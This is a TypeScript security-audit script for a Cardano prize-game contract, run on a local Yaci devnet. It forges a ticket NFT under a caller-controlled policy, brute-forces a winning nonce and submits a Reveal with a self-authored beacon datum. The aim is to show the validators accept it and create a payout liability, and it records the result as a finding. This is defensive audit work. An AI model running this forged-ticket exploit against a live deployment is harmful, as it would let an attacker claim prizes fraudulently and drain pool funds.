/**
 * Agent A — forged-ticket lifecycle probe (local Yaci only).
 *
 * One isolated transaction creates a PrizeDatum and ticket NFT through the
 * real B1 TicketIssued validator, using a caller-controlled native ticket
 * policy distinct from the Pool authority policy. The canonical MintPolicy,
 * Counter and Treasury are intentionally absent.
 *
 * The test then attempts a winning Reveal using a self-authored BeaconReady
 * PrizeDatum (no SyncBeacon/Registry reference). It is designed to determine
 * whether the forged ticket can crystallize a B1 pending liability.
 *
 * This is adversarial evidence only; no production policy or Reveal semantics
 * are changed by this trace.
 */

import { Constr, Data, Lucid, Blockfrost, getAddressDetails, nativeScriptFromJson, type Script, type UTxO } from 'lucid-cardano'
import { createHash } from 'node:crypto'
import { readFileSync, writeFileSync } from 'node:fs'

import { buildScriptsFromLucid } from '../../src/loadValidator'
import { createCardanoExecutionAdapter } from '../../Adapter/CARDANO/runtime/CardanoExecutionAdapter'
import {
  defaultPrizeTable,
  generateSymbols,
  classifyRowTier,
  rowPayoutTotal,
} from '../../src/gameRules'
import {
  deriveBeacon,
  deriveSymbolsSeed,
  deriveTicketSeed,
  encodeBeaconTarget,
  field,
  fromHex,
  playerCommitment,
  sha256,
  ticketCommitment,
  toHex,
} from '../../src/beacon'
import {
  assertCardanoObservedTransitionBinding,
  type CardanoObservedTransitionEvidence,
} from '../../Adapter/CARDANO/observation/CardanoObservedTransitionEvidence'
import {
  assertExecutableLiquidityMatchesAuthenticatedPool,
  type ExecutableLiquidityObservation,
} from '../../Adapter/CARDANO/observation/ExecutableLiquidityObservation'

const API = 'http://127.0.0.1:8080/api/v1'
const SEED =
  'test test test test test test test test test test test test test test test test test test test test test test test sauce'

const PRICE_USDM = 100n
const TOTAL_LIQUIDITY_USDM = 100_000n
const TICKET_NAME_HEX = '52462d5245414c2d52455645414c'
const ORACLE_STATE_POLICY_ID = '00'.repeat(28)
const ORACLE_STATE_TOKEN_NAME_HEX = '4f5241434c45'
const MAINCHAIN_REF = new Uint8Array(32)
const MATERIOS_CONTEXT = new Uint8Array(32)
const GAME_VERSION = new TextEncoder().encode('V1')

type NativeScript = { type: 'sig'; keyHash: string } | {
  type: 'all' | 'any'
  scripts: NativeScript[]
}

function nativePolicy(lucid: any, keyHash: string): Script {
  return nativeScriptFromJson({
    type: 'all',
    scripts: [{ type: 'sig', keyHash }],
  } as NativeScript)
}

function callerControlledTicketPolicy(lucid: any, keyHash: string): Script {
  return nativeScriptFromJson({
    type: 'any',
    scripts: [{ type: 'sig', keyHash }],
  } as NativeScript)
}

function sameAssetsForAudit(a: Record<string, bigint>, b: Record<string, bigint>): boolean {
  const normalize = (value: Record<string, bigint>) => Object.entries(value)
    .map(([k, v]) => [k, v.toString()] as [string, string])
    .sort(([left], [right]) => left.localeCompare(right))
  return JSON.stringify(normalize(a)) === JSON.stringify(normalize(b))
}

function hashJson(value: unknown): string {
  return createHash('sha256')
    .update(JSON.stringify(value, (_key, v) => typeof v === 'bigint' ? v.toString() : v))
    .digest('hex')
}

function ref(u: UTxO): string {
  return u.txHash + '#' + u.outputIndex
}

function c(index: number, fields: any[] = []): any {
  return new Constr(index, fields)
}

function prizeDatum(
  ticketPolicyId: string,
  prizePoolHash: string,
  playerCommitmentHex: string,
  commitmentHex: string,
  ticketNonce: bigint,
  beaconValueHex: string,
  issuedAt: bigint,
  expiresAt: bigint,
): any {
  return c(0, [
    ticketPolicyId,
    TICKET_NAME_HEX,
    playerCommitmentHex,
    PRICE_USDM,
    commitmentHex,
    toHex(GAME_VERSION),
    ticketNonce,
    0n,
    '',
    '',
    c(0),
    '',
    0n,
    c(0, [0n, 0n, toHex(MAINCHAIN_REF), toHex(GAME_VERSION)]),
    c(1),
    beaconValueHex,
    '11'.repeat(32),
    toHex(MATERIOS_CONTEXT),
    prizePoolHash,
    issuedAt,
    expiresAt,
    0n,
    0n,
  ])
}

function poolDatum(prizeHash: string, liquidity: bigint, reserve: bigint, count: bigint, liabilities: bigint): any {
  return c(0, [
    liquidity,
    liabilities,
    reserve,
    count,
    0n,
    10_000n,
    0n,
    prizeHash,
  ])
}

function wait(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

async function waitFor<T>(
  fn: () => Promise<T>,
  predicate: (value: T) => boolean,
  label: string,
): Promise<T> {
  for (let i = 0; i < 30; i += 1) {
    const value = await fn()
    if (predicate(value)) return value
    await wait(1000)
  }
  throw new Error('Timed out waiting for ' + label)
}

const wallet = JSON.parse(
  readFileSync('/tmp/immortal-yaci-test-wallet.json', 'utf8'),
)
const provider = new Blockfrost(API, '')
const lucid = await Lucid.new(provider, 'Preprod')
const protocolParameters = await provider.getProtocolParameters()
const jsonReplacer = (_key: string, value: unknown) =>
  typeof value === 'bigint' ? value.toString() : value
console.log(JSON.stringify({
  protocolParametersCostModelLengths: Object.fromEntries(
    Object.entries(protocolParameters.costModels ?? {}).map(([k, v]) => [k, Array.isArray(v) ? v.length : typeof v]),
  ),
}, null, 2))
lucid.selectWalletFromSeed(SEED)

const address = await lucid.wallet.address()
const details = getAddressDetails(address)
const keyHash = details.paymentCredential && details.paymentCredential.hash
if (!keyHash) throw new Error('test wallet has no payment key hash')

const testPolicy = nativePolicy(lucid, keyHash)
const testPolicyId = typeof lucid.utils.mintingPolicyToId === 'function' ? lucid.utils.mintingPolicyToId(testPolicy) : lucid.utils.validatorToScriptHash(testPolicy)
const attackerTicketPolicy = callerControlledTicketPolicy(lucid, keyHash)
const attackerTicketPolicyId = typeof lucid.utils.mintingPolicyToId === 'function'
  ? lucid.utils.mintingPolicyToId(attackerTicketPolicy)
  : lucid.utils.validatorToScriptHash(attackerTicketPolicy)
if (attackerTicketPolicyId === testPolicyId) {
  throw new Error('attacker ticket policy unexpectedly aliases the Pool authority policy')
}
const poolTokenNameHex = '504f4f4c'
const liquidityTokenNameHex = '5553444d'
const poolUnit = testPolicyId + poolTokenNameHex
const liquidityUnit = testPolicyId + liquidityTokenNameHex
const ticketUnit = attackerTicketPolicyId + TICKET_NAME_HEX

const scripts = buildScriptsFromLucid(
  lucid,
  defaultPrizeTable,
  keyHash,
  ORACLE_STATE_POLICY_ID,
  ORACLE_STATE_TOKEN_NAME_HEX,
  testPolicyId,
  poolTokenNameHex,
)

if (!scripts.prizeAddress || !scripts.b1PrizePoolAddress) {
  throw new Error('failed to derive Prize/B1PrizePool addresses')
}

const issuedAt = BigInt(Date.now())
const expiresAt = issuedAt + 3_600_000n

const beaconValue = await deriveBeacon(
  0,
  0,
  MAINCHAIN_REF,
  fromHex('11'.repeat(32)),
  MATERIOS_CONTEXT,
  GAME_VERSION,
)

// The caller knows the secret and controls the datum at the public Prize
// address. Search a small nonce range for a winning result before issuing the
// forged ticket. This is possible because the unauthorized path does not bind
// the ticket to the canonical MintPolicy or require an authenticated Registry
// transition to BeaconReady.
let winningFixture: {
  ticketNonce: bigint
  playerSecret: Uint8Array
  playerCommitmentHex: string
  commitmentHex: string
  symbols: Uint8Array
  expectedResult: Uint8Array
  row1Tier: number
  row2Tier: number
  payout: bigint
  prizeTier: number
} | null = null

for (let nonce = 1; nonce <= 256; nonce += 1) {
  const ticketNonce = BigInt(nonce)
  const playerSecret = fromHex(nonce.toString(16).padStart(64, '0'))
  const playerCommitmentHex = toHex(
    await playerCommitment(0, nonce, playerSecret),
  )
  const commitmentHex = toHex(
    await ticketCommitment(
      new TextEncoder().encode('RF-REAL-REVEAL'),
      fromHex(playerCommitmentHex),
      GAME_VERSION,
      nonce,
      Number(PRICE_USDM),
      encodeBeaconTarget({
        networkId: 0,
        round: 0,
        mainchainRef: MAINCHAIN_REF,
        version: GAME_VERSION,
      }),
    ),
  )
  const ticketSeed = await deriveTicketSeed(
    0,
    nonce,
    playerSecret,
    beaconValue,
    GAME_VERSION,
  )
  const symbolsSeed = await deriveSymbolsSeed(ticketSeed)
  const symbols = await generateSymbols(symbolsSeed)
  const digest = await sha256(symbolsSeed)
  const expectedResult = await sha256(
    new Uint8Array([...field(digest), ...field(symbols)]),
  )
  const row1Tier = classifyRowTier(symbols.slice(0, 3))
  const row2Tier = classifyRowTier(symbols.slice(3, 6))
  const payout = BigInt(
    rowPayoutTotal(defaultPrizeTable, row1Tier, row2Tier, Number(PRICE_USDM)),
  )
  if (payout > 0n) {
    winningFixture = {
      ticketNonce,
      playerSecret,
      playerCommitmentHex,
      commitmentHex,
      symbols,
      expectedResult,
      row1Tier,
      row2Tier,
      payout,
      prizeTier: Math.max(row1Tier, row2Tier),
    }
    break
  }
}
if (!winningFixture) throw new Error('no winning nonce found in bounded search')
const {
  ticketNonce,
  playerSecret,
  playerCommitmentHex,
  commitmentHex,
  symbols,
  expectedResult,
  row1Tier,
  row2Tier,
  payout,
  prizeTier,
} = winningFixture

const prePrizeDatum = prizeDatum(
  attackerTicketPolicyId,
  scripts.b1PrizePoolHash,
  playerCommitmentHex,
  commitmentHex,
  ticketNonce,
  toHex(beaconValue),
  issuedAt,
  expiresAt,
)

const postPrizeDatum = c(0, [
  attackerTicketPolicyId,
  TICKET_NAME_HEX,
  playerCommitmentHex,
  PRICE_USDM,
  commitmentHex,
  toHex(GAME_VERSION),
  ticketNonce,
  payout,
  '',
  '',
  c(1),
  toHex(expectedResult),
  BigInt(prizeTier),
  c(0, [0n, 0n, toHex(MAINCHAIN_REF), toHex(GAME_VERSION)]),
  c(1),
  toHex(beaconValue),
  '11'.repeat(32),
  toHex(MATERIOS_CONTEXT),
  scripts.b1PrizePoolHash,
  issuedAt,
  expiresAt,
  BigInt(row1Tier),
  BigInt(row2Tier),
])

const initialPoolDatum = poolDatum(
  scripts.prizeHash,
  TOTAL_LIQUIDITY_USDM,
  0n,
  0n,
  0n,
)
const issuedPoolDatum = poolDatum(
  scripts.prizeHash,
  TOTAL_LIQUIDITY_USDM,
  PRICE_USDM,
  1n,
  0n,
)
const postPoolDatum = poolDatum(
  scripts.prizeHash,
  TOTAL_LIQUIDITY_USDM,
  0n,
  0n,
  payout,
)

// Bootstrap only the B1 Pool. The ticket/PrizeDatum must be admitted
// through the real B1 TicketIssued spending transition below.
const bootstrap = await lucid
  .newTx()
  .mintAssets(
    {
      [poolUnit]: 1n,
      [liquidityUnit]: TOTAL_LIQUIDITY_USDM,
    },
    Data.void(),
  )
  .attachMintingPolicy(testPolicy)
  .payToContract(
    scripts.b1PrizePoolAddress,
    { inline: Data.to(initialPoolDatum) },
    {
      lovelace: 5_000_000n,
      [poolUnit]: 1n,
      [liquidityUnit]: TOTAL_LIQUIDITY_USDM,
    },
  )
  .addSigner(address)
  .complete()

const bootstrapSigned = await bootstrap.sign().complete()
const bootstrapHash = await bootstrapSigned.submit()
await lucid.awaitTx(bootstrapHash)

const initialPoolUtxos = await waitFor(
  () => lucid.utxosAt(scripts.b1PrizePoolAddress as string),
  (xs) => xs.some((u) => u.txHash === bootstrapHash && u.assets[poolUnit] === 1n),
  'initial B1PrizePool UTxO',
)
const initialPoolUtxo = initialPoolUtxos.find(
  (u) => u.txHash === bootstrapHash && u.assets[poolUnit] === 1n,
) as UTxO

// Unauthorized Issue attempt: caller-controlled ticket policy, no canonical
// MintPolicy, Counter input, or Treasury receipt. The Pool Value is preserved.
const issue = await lucid
  .newTx()
  .collectFrom([initialPoolUtxo], c(1, [PRICE_USDM]))
  .attachSpendingValidator(scripts.b1PrizePool as Script)
  .mintAssets({ [ticketUnit]: 1n }, Data.void())
  .attachMintingPolicy(attackerTicketPolicy)
  .payToContract(
    scripts.b1PrizePoolAddress as string,
    { inline: Data.to(issuedPoolDatum) },
    initialPoolUtxo.assets,
  )
  .payToContract(
    scripts.prizeAddress as string,
    { inline: Data.to(prePrizeDatum) },
    { lovelace: 3_000_000n },
  )
  .payToAddress(address, {
    lovelace: 3_000_000n,
    [ticketUnit]: 1n,
  })
  .addSigner(address)
  .complete()
const issueSigned = await issue.sign().complete()
const issueHash = await issueSigned.submit()
await lucid.awaitTx(issueHash)

const prizeUtxos = await waitFor(
  () => lucid.utxosAt(scripts.prizeAddress as string),
  (xs) => xs.some((u) => u.txHash === issueHash && u.assets.lovelace === 3_000_000n),
  'caller-policy PrizeDatum UTxO from TicketIssued',
)
const callerTicketUtxos = await waitFor(
  () => lucid.utxosAt(address),
  (xs) => xs.some((u) => u.assets[ticketUnit] === 1n),
  'caller-owned fake ticket NFT from TicketIssued',
)
const poolUtxos = await waitFor(
  () => lucid.utxosAt(scripts.b1PrizePoolAddress as string),
  (xs) => xs.some((u) => u.txHash === issueHash && u.assets[poolUnit] === 1n),
  'continuing B1PrizePool UTxO from TicketIssued',
)
const prizeUtxo = prizeUtxos.find(
  (u) => u.txHash === issueHash && u.assets.lovelace === 3_000_000n,
) as UTxO
const callerTicketUtxo = callerTicketUtxos.find(
  (u) => u.assets[ticketUnit] === 1n,
) as UTxO
const poolUtxo = poolUtxos.find(
  (u) => u.txHash === issueHash && u.assets[poolUnit] === 1n,
) as UTxO
if (!callerTicketUtxo || !sameAssetsForAudit(initialPoolUtxo.assets, poolUtxo.assets)) {
  throw new Error('TicketIssued failed to deliver the caller-owned fake NFT or changed the physical Pool Value')
}

// Real-ledger executable-liquidity correlation witness.
// This fixture's liquidity asset is deliberately a 1:1 USDM test asset, so
// the authenticated fixture valuation is the exact observed quantity.
// It is NOT a substitute for production Economic.poolUsdmValue oracle
// valuation; the latter remains an explicit conformance requirement.
const poolRef = ref(poolUtxo)
const fixturePoolUsdmValue = poolUtxo.assets[liquidityUnit] ?? 0n
const executableLiquidityObservation: ExecutableLiquidityObservation = {
  observationReference: 'RF10-RF11-YACI-POOL-LIQUIDITY-' + poolRef,
  observedAt: BigInt(Date.now()),
  sourceInputReferences: [poolRef],
  utxos: [{
    txHash: poolUtxo.txHash,
    index: poolUtxo.outputIndex,
    usdmValue: fixturePoolUsdmValue,
    spendable: true,
    ringFenced: false,
  }],
  declaredUsdmLiquidity: fixturePoolUsdmValue,
}
assertExecutableLiquidityMatchesAuthenticatedPool(
  executableLiquidityObservation,
  poolRef,
  fixturePoolUsdmValue,
)

const preStateFingerprint = hashJson({
  prizeRef: ref(prizeUtxo),
  prizeDatum: prizeUtxo.datum,
  poolRef: ref(poolUtxo),
  poolDatum: poolUtxo.datum,
})

// Publish the two validator scripts as reference-script UTxOs before building Reveal.
const prizeReferenceTx = await lucid
  .newTx()
  .payToAddressWithData(
    address,
    { scriptRef: scripts.prizeValidator as Script },
    { lovelace: 2_000_000n },
  )
  .complete()
const prizeReferenceSigned = await prizeReferenceTx.sign().complete()
const prizeReferenceHash = await prizeReferenceSigned.submit()
await lucid.awaitTx(prizeReferenceHash)

const poolReferenceTx = await lucid
  .newTx()
  .payToAddressWithData(
    address,
    { scriptRef: scripts.b1PrizePool as Script },
    { lovelace: 2_000_000n },
  )
  .complete()
const poolReferenceSigned = await poolReferenceTx.sign().complete()
const poolReferenceHash = await poolReferenceSigned.submit()
await lucid.awaitTx(poolReferenceHash)

const referenceUtxos = await lucid.utxosAt(address)
const prizeReferenceUtxo = referenceUtxos.find((u) => u.txHash === prizeReferenceHash)
const poolReferenceUtxo = referenceUtxos.find((u) => u.txHash === poolReferenceHash)
if (!prizeReferenceUtxo || !poolReferenceUtxo) {
  throw new Error('reference-script UTxOs were not materialized on Yaci')
}
// Some provider versions rehydrate a valid reference-script output without
// decoding scriptRef. Restore only the already-known script bytes on the local
// UTxO object; the selected output remains the exact Yaci ledger output.
const prizeReferenceInput = {
  ...prizeReferenceUtxo,
  scriptRef: (prizeReferenceUtxo as any).scriptRef ?? scripts.prizeValidator,
}
const poolReferenceInput = {
  ...poolReferenceUtxo,
  scriptRef: (poolReferenceUtxo as any).scriptRef ?? scripts.b1PrizePool,
}

const expectedPrizeHash = lucid.utils.validatorToScriptHash(scripts.prizeValidator as Script)
const expectedPoolHash = lucid.utils.validatorToScriptHash(scripts.b1PrizePool as Script)
if (lucid.utils.validatorToScriptHash((prizeReferenceInput as any).scriptRef) !== expectedPrizeHash) {
  throw new Error('PrizeValidator reference script hash mismatch')
}
if (lucid.utils.validatorToScriptHash((poolReferenceInput as any).scriptRef) !== expectedPoolHash) {
  throw new Error('B1PrizePool reference script hash mismatch')
}

const reveal = await lucid
  .newTx()
  .readFrom([prizeReferenceInput, poolReferenceInput])
  .collectFrom([prizeUtxo], c(1, [toHex(playerSecret)]))
  .collectFrom([poolUtxo], c(2, [PRICE_USDM]))
  .payToContract(
    scripts.prizeAddress as string,
    { inline: Data.to(postPrizeDatum) },
    prizeUtxo.assets,
  )
  .payToContract(
    scripts.b1PrizePoolAddress as string,
    { inline: Data.to(postPoolDatum) },
    poolUtxo.assets,
  )
  .addSigner(address)
  .validTo(Number(expiresAt))
  .complete()

let signedReveal: any = null
/*
 * Audit harness only: this trace measures a real Yaci ledger realization.
 * It is not the production economic-admission path. Production economic
 * orchestrators must use submitEconomic() with an authoritative witness.
 */
const executionAdapter = createCardanoExecutionAdapter({
  signTx: async (tx: unknown) => {
    signedReveal = await lucid.signTx(tx as any)
    return signedReveal
  },
  submitTx: async (signedTx: unknown) => lucid.submitTx(signedTx as any),
})
const submission = await executionAdapter.submitInfrastructure(reveal)
const txHash = submission.transactionRef
if (!signedReveal) throw new Error('Adapter did not retain the signed Reveal for replay evidence')
const txCbor = signedReveal.toCBOR()
const txBytes = Buffer.from(txCbor, 'hex').length
console.log(JSON.stringify({
  revealSerializedBytes: txBytes,
  maxTxSize: protocolParameters.maxTxSize ?? null,
  belowMaxTxSize: typeof protocolParameters.maxTxSize === 'number'
    ? txBytes <= protocolParameters.maxTxSize
    : null,
  prizeReference: prizeReferenceHash + '#0',
  poolReference: poolReferenceHash + '#0',
}, null, 2))
if (typeof protocolParameters.maxTxSize === 'number' && txBytes > protocolParameters.maxTxSize) {
  throw new Error(`Reveal transaction remains over maxTxSize: ${txBytes} > ${protocolParameters.maxTxSize}`)
}
writeFileSync(
  'audit/yaci-evidence/reveal-tx.cbor',
  Buffer.from(txCbor, 'hex'),
)
writeFileSync(
  'audit/yaci-evidence/reveal-protocol-parameters.json',
  JSON.stringify(protocolParameters, jsonReplacer, 2),
)
await lucid.awaitTx(txHash)

const postPrizeUtxos = await waitFor(
  () => lucid.utxosAt(scripts.prizeAddress as string),
  (xs) => xs.some((u) => u.txHash === txHash && u.assets.lovelace === 3_000_000n),
  'revealed PrizeDatum UTxO',
)
const postPoolUtxos = await waitFor(
  () => lucid.utxosAt(scripts.b1PrizePoolAddress as string),
  (xs) => xs.some((u) => u.txHash === txHash && u.assets[poolUnit] === 1n),
  'revealed B1PrizePool UTxO',
)
const postPrize = postPrizeUtxos.find((u) => u.txHash === txHash && u.assets.lovelace === 3_000_000n) as UTxO
const callerTicketAfterReveal = await lucid.utxosAt(address)
const callerStillOwnsTicket = callerTicketAfterReveal.some(
  (u) => u.assets[ticketUnit] === 1n,
)
if (!callerStillOwnsTicket) throw new Error('Reveal unexpectedly consumed caller-owned ticket NFT')
const postPool = postPoolUtxos.find((u) => u.txHash === txHash && u.assets[poolUnit] === 1n) as UTxO

const postStateFingerprint = hashJson({
  prizeRef: ref(postPrize),
  prizeDatum: postPrize.datum,
  poolRef: ref(postPool),
  poolDatum: postPool.datum,
})

const actionFingerprint = hashJson({
  actionClass: 'REVEAL',
  ticketInput: ref(prizeUtxo),
  poolInput: ref(poolUtxo),
  ticketPolicyId: attackerTicketPolicyId,
  ticketNameHex: TICKET_NAME_HEX,
  priceUsdm: PRICE_USDM,
  payout,
  row1Tier,
  row2Tier,
  prizeTier,
  resultHex: toHex(expectedResult),
})

const evidence: CardanoObservedTransitionEvidence = {
  evidenceId: hashJson({
    fixtureId: 'AGENT-A-FORGED-TICKET-REVEAL-001',
    actionFingerprint,
    preStateFingerprint,
    postStateFingerprint,
    transactionRef: txHash,
  }),
  fixtureId: 'AGENT-A-FORGED-TICKET-REVEAL-001',
  actionClass: 'REVEAL',
  environment: 'local-yaci-devnet',
  preStateObservationFingerprint: preStateFingerprint,
  postStateObservationFingerprint: postStateFingerprint,
  actionObservationFingerprint: actionFingerprint,
  transactionRef: txHash,
}

assertCardanoObservedTransitionBinding(evidence, {
  actionClass: 'REVEAL',
  environment: 'local-yaci-devnet',
  preStateObservationFingerprint: preStateFingerprint,
  postStateObservationFingerprint: postStateFingerprint,
  actionObservationFingerprint: actionFingerprint,
  transactionRef: txHash,
})

let replayRejected = false
let replayError = ''
try {
  await lucid.submitTx(signedReveal)
} catch (error) {
  replayRejected = true
  replayError = error instanceof Error ? error.message : String(error)
}
if (!replayRejected) {
  throw new Error('stale/duplicate Reveal submission was unexpectedly accepted')
}

const txResponse = await fetch(API + '/txs/' + txHash + '/utxos')
if (!txResponse.ok) {
  throw new Error('Yaci tx/utxos query failed: ' + txResponse.status)
}
const txUtxos = await txResponse.json()

writeFileSync(
  'audit/yaci-evidence/reveal-transition.json',
  JSON.stringify({
    purpose: 'agent-a-forged-ticket-issue-to-reveal-local-yaci',
    bootstrapHash,
    ticketIssuedTransactionRef: issueHash,
    ticketPolicyBoundary: {
      poolAuthorityPolicyId: testPolicyId,
      callerTicketPolicyId: attackerTicketPolicyId,
      distinctPolicies: testPolicyId !== attackerTicketPolicyId,
      canonicalMintPolicyAttached: false,
      counterInputPresent: false,
      treasuryReceiptPresent: false,
      ticketAssetUnit: ticketUnit,
      prizeOutputCreatedByTicketIssued: true,
      ticketDeliveredToCallerWallet: true,
      callerTicketReference: ref(callerTicketUtxo),
      callerStillOwnsTicketAfterReveal: callerStillOwnsTicket,
      prizeOutputCarriesTicketNft: false,
      poolOutputCreatedByTicketIssued: true,
      physicalPoolValuePreserved: sameAssetsForAudit(initialPoolUtxo.assets, poolUtxo.assets),
      beaconStateSetToReadyAtIssue: true,
      syncBeaconExecuted: false,
      beaconRegistryReferenceProvidedToReveal: false,
    },
    transactionRef: txHash,
    txCbor,
    action: {
      actionClass: 'REVEAL',
      ticketNonce: ticketNonce.toString(),
      priceUsdm: PRICE_USDM.toString(),
      payout: payout.toString(),
      row1Tier,
      row2Tier,
      prizeTier,
      resultHex: toHex(expectedResult),
    },
    preState: {
      prizeRef: ref(prizeUtxo),
      poolRef: ref(poolUtxo),
      fingerprint: preStateFingerprint,
    },
    postState: {
      prizeRef: ref(postPrize),
      poolRef: ref(postPool),
      fingerprint: postStateFingerprint,
    },
    consumedUtxos: [ref(prizeUtxo), ref(poolUtxo)],
    producedUtxos: [ref(postPrize), ref(postPool)],
    callerTicketReference: ref(callerTicketUtxo),
    callerStillOwnsTicketAfterReveal: callerStillOwnsTicket,
    executableLiquidityCorrelation: {
      observationReference: executableLiquidityObservation.observationReference,
      poolInputReference: poolRef,
      observedPoolUsdmValue: fixturePoolUsdmValue.toString(),
      sourceSetExact: true,
      valuationMode: 'fixture-1-to-1-test-asset',
      canonicalEconomicPoolUsdmValueEvaluated: false,
    },
    forgedTicketRevealGate: {
      expected: 'REJECTED_BY_CANONICAL_TICKET_AND_BEACON_AUTHORITY',
      observed: 'FORGED_TICKET_REVEAL_ACCEPTED',
      payoutPositive: payout > 0n,
      pendingLiabilityCreated: payout > 0n,
      payoutSubunits: payout.toString(),
      row1Tier,
      row2Tier,
      prizeTier,
    },
    observedCardanoTransitionEvidence: evidence,
    replay: {
      rejected: replayRejected,
      error: replayError,
    },
    yaciTransactionUtxos: txUtxos,
  }, null, 2),
)

console.log(JSON.stringify({
  issueTransactionRef: issueHash,
  issuePoolReference: ref(initialPoolUtxo),
  issueTicketPolicyId: attackerTicketPolicyId,
  issuePoolPolicyId: testPolicyId,
  revealTransactionRef: txHash,
  bootstrapHash,
  consumedUtxos: [ref(prizeUtxo), ref(poolUtxo)],
  producedUtxos: [ref(postPrize), ref(postPool)],
  payout: payout.toString(),
  replayRejected,
  payoutPositive: payout > 0n,
}, null, 2))

if (payout > 0n) {
  console.error('SECURITY_FINDING: B1 accepted a caller-policy ticket with caller-authored BeaconReady datum and Reveal crystallized a positive pending liability without canonical MintPolicy, Counter, Treasury, or SyncBeacon/Registry reference')
  process.exitCode = 4
}
